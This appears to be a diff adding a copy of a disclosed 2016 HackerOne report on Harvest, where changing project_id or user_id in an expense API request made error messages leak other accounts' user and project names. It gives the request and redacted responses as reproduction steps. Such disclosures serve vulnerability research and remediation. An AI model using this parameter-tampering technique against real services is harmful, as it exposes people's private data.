@@ -1,0 +1,45 @@
+ReportLink:https://hackerone.com/reports/152696
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/eboda
+ReportedTo:Harvest(harvest)
+BountyAmount:1000.0
+Severity:
+State:Closed
+DateOfDisclosure:04.10.2016 18:49:10
+
+Summary:
+
+Summary
+------------
+
+All project names and user names can be leaked, even cross application.
+
+Steps to reproduce
+------------
+
+1.  Create a new expense, this should generate a POST request like this:
+ 
+    ```{bash}
+POST /api/v2/expenses?user_id=1340164 HTTP/1.1
+Host: 8888sasdf.harvestapp.com
+[- snip -]
+
+    -----------------------------114950898617589081931570033785
+Content-Disposition: form-data; name="project_id"
+
+    11298632
+
+    [-snip-]
+```
+
+2. Now just change the `project_id` to any other id and the server will answer:
+
+    ```{js}
+{"message":"Test test is not assigned\n  to ███████████████ project"}
+```
+
+3. You can also change the `user_id` and the server will leak that one as well. We can leak `user_id = 1` and `project_id = 1` for example:
+
+    ```{js}
+{"message":"██████████ is not assigned\n  to █████ project"}
+```
